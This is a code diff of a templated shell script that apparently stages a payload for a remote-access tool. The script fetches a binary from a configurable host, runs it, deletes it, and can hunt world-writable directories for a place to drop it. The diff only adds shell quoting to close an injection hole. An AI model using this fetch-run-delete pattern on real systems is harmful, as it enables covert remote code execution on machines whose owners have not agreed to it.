@@ -6,40 +6,39 @@ export PATH="$PATH:/usr/local/sbin:/usr/local/bin:/usr/bin:/bin:/sbin"
 download () {
 
     if command -v curl &> /dev/null; then
-        curl {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}} -o "$1/{{.Name}}"
+        curl {{shq (printf "%s://%s:%s/%s" .Protocol .Host .Port .Name)}} -o "$1"/{{shq .Name}}
     elif command -v  wget &> /dev/null; then
-        wget -O "$1/{{.Name}}" {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}}
+        wget -O "$1"/{{shq .Name}} {{shq (printf "%s://%s:%s/%s" .Protocol .Host .Port .Name)}}
     fi
 
-    chmod +x "$1/{{.Name}}"
+    chmod +x "$1"/{{shq .Name}}
 }
 
 {{if .WorkingDirectory}}
 
-download "{{.WorkingDirectory}}"
+download {{shq .WorkingDirectory}}
 
-"{{.WorkingDirectory}}/{{.Name}}"
+{{shq .WorkingDirectory}}/{{shq .Name}}
 
-rm "{{.WorkingDirectory}}/{{.Name}}"
+rm {{shq .WorkingDirectory}}/{{shq .Name}}
 
 {{else}}
 
 for i in "~" "." $(find / -maxdepth 3 -type d \( -perm -o+w \)); do
 
-    if ! touch $i/{{.Name}}; then 
+    if ! touch "$i"/{{shq .Name}}; then 
         continue
     fi
 
     download "$i"
 
-    if ! "$i/{{.Name}}"; then 
+    if ! "$i"/{{shq .Name}}; then 
         continue
     fi
 
-    rm "$i/{{.Name}}"
+    rm "$i"/{{shq .Name}}
 
     break
 done
 
 {{end}}
-
